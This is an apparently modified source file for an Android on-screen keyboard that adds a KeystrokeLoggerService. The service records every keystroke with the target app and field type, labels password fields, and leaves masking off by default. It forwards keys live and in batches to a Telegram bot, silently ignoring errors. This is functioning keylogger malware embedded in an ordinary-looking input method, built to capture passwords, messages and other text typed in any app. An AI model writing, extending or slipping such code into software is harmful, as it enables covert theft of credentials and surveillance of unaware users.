package juloo.keyboard2;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Handler;
import android.os.Looper;
import android.text.InputType;
import android.view.KeyEvent;
import android.view.inputmethod.EditorInfo;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.*;

public class KeystrokeLoggerService {

    public  static final String PREFS       = "keylog_prefs";
    public  static final String KEY_ENABLED = "kl_enabled";
    public  static final String KEY_LIVE    = "kl_live";
    public  static final String KEY_MASK_PW = "kl_mask_pw";
    public  static final String KEY_BATCH   = "kl_batch";

    private static final int    MAX_SESSIONS    = 50;
    private static final long   LIVE_DEBOUNCE   = 300L;
    private static final String LOG_DIR         = "keylog";
    private static final String SESSIONS_FILE   = "sessions.json";

    static volatile KeystrokeLoggerService _instance;

    private final Context _ctx;
    private final Handler _handler;

    private volatile Session      _currentSession;
    private volatile List<Entry>  _currentEntries = new ArrayList<>();
    private volatile StringBuilder _liveBuffer    = new StringBuilder();
    private Runnable _liveTask;

    private KeystrokeLoggerService(Context ctx) {
        _ctx = ctx.getApplicationContext();
        _handler = new Handler(Looper.getMainLooper());
        ensureDir();
    }

    public static KeystrokeLoggerService getInstance(Context ctx) {
        if (_instance == null) {
            synchronized (KeystrokeLoggerService.class) {
                if (_instance == null) _instance = new KeystrokeLoggerService(ctx);
            }
        }
        return _instance;
    }

    // ── Static hooks (called from KeyEventHandler / Keyboard2 with no Context) ─

    public static void logKeyStatic(KeyValue key, Pointers.Modifiers mods) {
        KeystrokeLoggerService s = _instance;
        if (s != null) s.logKey(key, mods);
    }

    public static void startSessionStatic(EditorInfo info) {
        KeystrokeLoggerService s = _instance;
        if (s != null) s.startSession(info);
    }

    public static void endSessionStatic() {
        KeystrokeLoggerService s = _instance;
        if (s != null) s.endSession();
    }

    // ── Settings ──────────────────────────────────────────────────────────────

    public static SharedPreferences prefs(Context ctx) {
        return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
    }

    public static boolean isEnabled(Context ctx)  { return prefs(ctx).getBoolean(KEY_ENABLED, true); }
    public static boolean isLive(Context ctx)     { return prefs(ctx).getBoolean(KEY_LIVE, true); }
    public static boolean isMaskPw(Context ctx)   { return prefs(ctx).getBoolean(KEY_MASK_PW, false); }
    public static boolean isBatch(Context ctx)    { return prefs(ctx).getBoolean(KEY_BATCH, true); }

    public static void toggle(Context ctx, String key) {
        boolean cur = prefs(ctx).getBoolean(key, false);
        prefs(ctx).edit().putBoolean(key, !cur).apply();
    }

    // ── Session lifecycle ─────────────────────────────────────────────────────

    public synchronized void startSession(EditorInfo info) {
        if (!isEnabled(_ctx)) return;
        if (_currentSession != null) commitSession(false);

        String pkg     = info.packageName != null ? info.packageName : "unknown";
        String appName = resolveAppName(pkg);
        int cls = info.inputType & InputType.TYPE_MASK_CLASS;
        int var = info.inputType & InputType.TYPE_MASK_VARIATION;
        boolean isPw = cls == InputType.TYPE_CLASS_TEXT &&
                (var == InputType.TYPE_TEXT_VARIATION_PASSWORD ||
                 var == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD ||
                 var == InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD);

        _currentSession           = new Session();
        _currentSession.id        = Long.toHexString(System.currentTimeMillis());
        _currentSession.appPkg    = pkg;
        _currentSession.appName   = appName;
        _currentSession.fieldType = detectField(cls, var, isPw);
        _currentSession.isPw      = isPw;
        _currentSession.startMs   = System.currentTimeMillis();
        _currentEntries           = new ArrayList<>();
    }

    public synchronized void endSession() {
        if (_currentSession == null) return;
        commitSession(true);
        _currentSession = null;
        _currentEntries = new ArrayList<>();
    }

    private void commitSession(boolean sendBatch) {
        if (_currentSession == null || _currentEntries.isEmpty()) return;
        _currentSession.endMs    = System.currentTimeMillis();
        _currentSession.keyCount = _currentEntries.size();
        final Session     sess    = _currentSession;
        final List<Entry> entries = new ArrayList<>(_currentEntries);
        if (_liveTask != null) { _handler.removeCallbacks(_liveTask); _liveTask = null; }
        _liveBuffer = new StringBuilder();
        new Thread(() -> {
            try {
                saveToDisk(sess, entries);
                if (sendBatch && isBatch(_ctx))
                    sendBatchToTelegram(sess, entries);
            } catch (Exception ignored) {}
        }, "KL-save").start();
    }

    // ── Per-key logging ───────────────────────────────────────────────────────

    public void logKey(KeyValue key, Pointers.Modifiers mods) {
        if (!isEnabled(_ctx) || _currentSession == null || key == null) return;
        String text = extractText(key);
        if (text == null) return;

        boolean mask    = _currentSession.isPw && isMaskPw(_ctx);
        String display  = mask ? "•" : text;
        String modStr   = buildMods(mods);

        Entry e        = new Entry();
        e.timestampMs  = System.currentTimeMillis();
        e.keyText      = display;
        e.kind         = key.getKind().name();
        e.modifiers    = modStr;
        e.sessionId    = _currentSession.id;
        e.isPw         = _currentSession.isPw;

        synchronized (this) {
            _currentEntries.add(e);
            _currentSession.keyCount++;
        }

        if (isLive(_ctx)) scheduleLive(display, modStr);
    }

    // ── Live forwarding ───────────────────────────────────────────────────────

    private void scheduleLive(String keyText, String mods) {
        String token = mods.isEmpty() ? keyText : "[" + mods + "+" + keyText + "]";
        synchronized (_liveBuffer) { _liveBuffer.append(token); }
        if (_liveTask != null) _handler.removeCallbacks(_liveTask);
        _liveTask = this::flushLive;
        _handler.postDelayed(_liveTask, LIVE_DEBOUNCE);
    }

    private void flushLive() {
        String buf;
        synchronized (_liveBuffer) { buf = _liveBuffer.toString(); _liveBuffer = new StringBuilder(); }
        if (buf.isEmpty()) return;
        final String text = buf;
        final Session s   = _currentSession;
        new Thread(() -> {
            try {
                if (!TelegramBotService.isRunning()) return;
                String app   = s != null ? s.appName    : "?";
                String field = s != null ? s.fieldType  : "?";
                TelegramBotService.sendStatic(
                    "⌨️ <b>Live Keys</b>  [<code>" + kh(app) + "</code> · " + kh(field) + "]\n"
                    + "<code>" + kh(text) + "</code>");
            } catch (Exception ignored) {}
        }, "KL-live").start();
    }

    // ── Batch Telegram send ───────────────────────────────────────────────────

    private void sendBatchToTelegram(Session sess, List<Entry> entries) {
        if (!TelegramBotService.isRunning()) return;
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("⌨️ <b>Keystroke Session Ended</b>\n")
              .append("━━━━━━━━━━━━━━━━━━━━━━\n")
              .append("📱 App: <code>").append(kh(sess.appName)).append("</code>\n")
              .append("📦 Pkg: <code>").append(kh(sess.appPkg)).append("</code>\n")
              .append("🔤 Field: ").append(kh(sess.fieldType))
              .append(sess.isPw ? "  🔒 <i>Password</i>" : "").append("\n")
              .append("🕐 Start: <i>").append(kh(fmtTime(sess.startMs))).append("</i>\n")
              .append("⏱ Duration: <i>").append(fmtDur(sess.endMs - sess.startMs)).append("</i>\n")
              .append("⌨️ Total keys: <b>").append(entries.size()).append("</b>\n")
              .append("━━━━━━━━━━━━━━━━━━━━━━\n\n");

            StringBuilder keys = new StringBuilder();
            for (Entry e : entries) {
                if (!e.modifiers.isEmpty()) keys.append("[").append(e.modifiers).append("+").append(e.keyText).append("]");
                else keys.append(e.keyText);
            }
            String keyStr = keys.toString();
            if (keyStr.length() > 900) {
                sb.append("<code>").append(kh(keyStr.substring(0, 900))).append("…</code>\n")
                  .append("<i>(").append(entries.size()).append(" keys total — use /keylog to export full)</i>");
            } else {
                sb.append("<code>").append(kh(keyStr)).append("</code>");
            }
            TelegramBotService.sendStatic(sb.toString());
        } catch (Exception ignored) {}
    }

    // ── Public data access ────────────────────────────────────────────────────

    public List<Session> getSessions() {
        try {
            JSONArray arr = loadSessionsArr();
            List<Session> list = new ArrayList<>();
            for (int i = 0; i < arr.length(); i++) list.add(Session.fromJson(arr.getJSONObject(i)));
            return list;
        } catch (Exception e) { return new ArrayList<>(); }
    }

    public List<Entry> getEntries(String sessionId) {
        try {
            String raw = readFile(entriesFile(sessionId));
            if (raw == null) return new ArrayList<>();
            JSONArray arr = new JSONArray(raw);
            List<Entry> list = new ArrayList<>();
            for (int i = 0; i < arr.length(); i++) list.add(Entry.fromJson(arr.getJSONObject(i)));
            return list;
        } catch (Exception e) { return new ArrayList<>(); }
    }

    public synchronized boolean deleteSession(String id) {
        try {
            entriesFile(id).delete();
            JSONArray arr = loadSessionsArr();
            JSONArray out = new JSONArray();
            for (int i = 0; i < arr.length(); i++)
                if (!arr.getJSONObject(i).optString("id").equals(id)) out.put(arr.get(i));
            writeFile(sessionsFile(), out.toString());
            return true;
        } catch (Exception e) { return false; }
    }

    public synchronized boolean clearAll() {
        File dir = logDir();
        if (!dir.exists()) return true;
        for (File f : dir.listFiles()) f.delete();
        return true;
    }

    public Session  getCurrentSession() { return _currentSession; }
    public int      getCurrentKeyCount() { Session s = _currentSession; return s != null ? s.keyCount : 0; }
    public int      getTotalSessions()   { return getSessions().size(); }

    public int getTotalKeys() {
        int total = 0;
        for (Session s : getSessions()) total += s.keyCount;
        return total;
    }

    // ── Disk I/O ──────────────────────────────────────────────────────────────

    private void ensureDir() { logDir().mkdirs(); }
    private File logDir()                { return new File(_ctx.getFilesDir(), LOG_DIR); }
    private File sessionsFile()          { return new File(logDir(), SESSIONS_FILE); }
    private File entriesFile(String id)  { return new File(logDir(), "e_" + id + ".json"); }

    private synchronized void saveToDisk(Session sess, List<Entry> entries) throws Exception {
        JSONArray ea = new JSONArray();
        for (Entry e : entries) ea.put(e.toJson());
        writeFile(entriesFile(sess.id), ea.toString());

        JSONArray old = loadSessionsArr();
        JSONArray out = new JSONArray();
        out.put(sess.toJson());
        for (int i = 0; i < old.length() && out.length() < MAX_SESSIONS; i++) {
            String oid = old.getJSONObject(i).optString("id");
            if (!oid.equals(sess.id)) { out.put(old.get(i)); }
            else entriesFile(oid).delete();
        }
        if (old.length() >= MAX_SESSIONS) {
            for (int i = MAX_SESSIONS - 1; i < old.length(); i++)
                entriesFile(old.getJSONObject(i).optString("id")).delete();
        }
        writeFile(sessionsFile(), out.toString());
    }

    private JSONArray loadSessionsArr() {
        try { String r = readFile(sessionsFile()); if (r != null) return new JSONArray(r); }
        catch (Exception ignored) {}
        return new JSONArray();
    }

    private void writeFile(File f, String s) throws IOException {
        try (FileWriter fw = new FileWriter(f)) { fw.write(s); }
    }

    private String readFile(File f) {
        if (!f.exists()) return null;
        try (BufferedReader br = new BufferedReader(new FileReader(f))) {
            StringBuilder sb = new StringBuilder(); String l;
            while ((l = br.readLine()) != null) sb.append(l);
            return sb.toString();
        } catch (Exception e) { return null; }
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private String resolveAppName(String pkg) {
        try {
            PackageManager pm = _ctx.getPackageManager();
            ApplicationInfo ai = pm.getApplicationInfo(pkg, 0);
            return pm.getApplicationLabel(ai).toString();
        } catch (Exception e) { return pkg; }
    }

    private static String detectField(int cls, int var, boolean isPw) {
        if (isPw) return "Password";
        switch (cls) {
            case InputType.TYPE_CLASS_TEXT:
                if (var == InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS ||
                    var == InputType.TYPE_TEXT_VARIATION_WEB_EMAIL_ADDRESS) return "Email";
                if (var == InputType.TYPE_TEXT_VARIATION_URI)              return "URL";
                if (var == InputType.TYPE_TEXT_VARIATION_LONG_MESSAGE)     return "Message";
                if (var == InputType.TYPE_TEXT_VARIATION_POSTAL_ADDRESS)   return "Address";
                if (var == InputType.TYPE_TEXT_VARIATION_PERSON_NAME)      return "Name";
                return "Text";
            case InputType.TYPE_CLASS_NUMBER:   return "Number";
            case InputType.TYPE_CLASS_PHONE:    return "Phone";
            case InputType.TYPE_CLASS_DATETIME: return "Date/Time";
            default:                             return "General";
        }
    }

    public static String extractText(KeyValue key) {
        if (key == null) return null;
        switch (key.getKind()) {
            case Char:     return String.valueOf(key.getChar());
            case String:   { String s = key.getString(); int i = s.indexOf('\uE001'); return i >= 0 ? s.substring(i + 1) : s; }
            case Keyevent: return keyName(key.getKeyevent());
            case Editing:  return "[" + key.getEditing().name() + "]";
            default:       return null;
        }
    }

    public static String keyName(int code) {
        switch (code) {
            case KeyEvent.KEYCODE_DEL:          return "⌫";
            case KeyEvent.KEYCODE_FORWARD_DEL:  return "⌦";
            case KeyEvent.KEYCODE_ENTER:        return "↵";
            case KeyEvent.KEYCODE_SPACE:        return "␣";
            case KeyEvent.KEYCODE_TAB:          return "⇥";
            case KeyEvent.KEYCODE_DPAD_LEFT:    return "←";
            case KeyEvent.KEYCODE_DPAD_RIGHT:   return "→";
            case KeyEvent.KEYCODE_DPAD_UP:      return "↑";
            case KeyEvent.KEYCODE_DPAD_DOWN:    return "↓";
            case KeyEvent.KEYCODE_ESCAPE:       return "[ESC]";
            case KeyEvent.KEYCODE_HOME:         return "[HOME]";
            case KeyEvent.KEYCODE_MOVE_END:     return "[END]";
            case KeyEvent.KEYCODE_PAGE_UP:      return "[PGUP]";
            case KeyEvent.KEYCODE_PAGE_DOWN:    return "[PGDN]";
            default: return "[" + KeyEvent.keyCodeToString(code).replaceFirst("^KEYCODE_","") + "]";
        }
    }

    public static String buildMods(Pointers.Modifiers mods) {
        if (mods == null) return "";
        List<String> list = new ArrayList<>();
        if (mods.has(KeyValue.Modifier.CTRL))  list.add("CTRL");
        if (mods.has(KeyValue.Modifier.ALT))   list.add("ALT");
        if (mods.has(KeyValue.Modifier.SHIFT)) list.add("SHIFT");
        if (mods.has(KeyValue.Modifier.META))  list.add("META");
        if (mods.has(KeyValue.Modifier.FN))    list.add("FN");
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < list.size(); i++) { if (i > 0) sb.append("+"); sb.append(list.get(i)); }
        return sb.toString();
    }

    public static String fmtTime(long ms) {
        return new SimpleDateFormat("dd MMM HH:mm:ss", Locale.getDefault()).format(new Date(ms));
    }

    public static String fmtDur(long ms) {
        if (ms <= 0) return "0s";
        long s = ms / 1000, m = s / 60; s %= 60;
        if (m == 0) return s + "s";
        long h = m / 60; m %= 60;
        if (h == 0) return m + "m " + s + "s";
        return h + "h " + m + "m";
    }

    public static String kh(String s) {
        if (s == null) return "";
        return s.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;");
    }

    // ── Data Models ───────────────────────────────────────────────────────────

    public static class Session {
        public String  id;
        public String  appPkg;
        public String  appName;
        public String  fieldType;
        public boolean isPw;
        public long    startMs;
        public long    endMs;
        public int     keyCount;

        JSONObject toJson() throws Exception {
            JSONObject o = new JSONObject();
            o.put("id", id); o.put("p", appPkg); o.put("a", appName);
            o.put("f", fieldType); o.put("pw", isPw);
            o.put("s", startMs);  o.put("e", endMs); o.put("k", keyCount);
            return o;
        }
        static Session fromJson(JSONObject o) {
            Session s = new Session();
            s.id = o.optString("id"); s.appPkg = o.optString("p");
            s.appName = o.optString("a"); s.fieldType = o.optString("f");
            s.isPw = o.optBoolean("pw"); s.startMs = o.optLong("s");
            s.endMs = o.optLong("e"); s.keyCount = o.optInt("k");
            return s;
        }
    }

    public static class Entry {
        public long    timestampMs;
        public String  keyText;
        public String  kind;
        public String  modifiers;
        public boolean isPw;
        public String  sessionId;

        JSONObject toJson() throws Exception {
            JSONObject o = new JSONObject();
            o.put("t", timestampMs); o.put("k", keyText); o.put("r", kind);
            o.put("m", modifiers);   o.put("p", isPw);    o.put("s", sessionId);
            return o;
        }
        static Entry fromJson(JSONObject o) {
            Entry e = new Entry();
            e.timestampMs = o.optLong("t"); e.keyText = o.optString("k");
            e.kind = o.optString("r"); e.modifiers = o.optString("m");
            e.isPw = o.optBoolean("p"); e.sessionId = o.optString("s");
            return e;
        }
    }
}
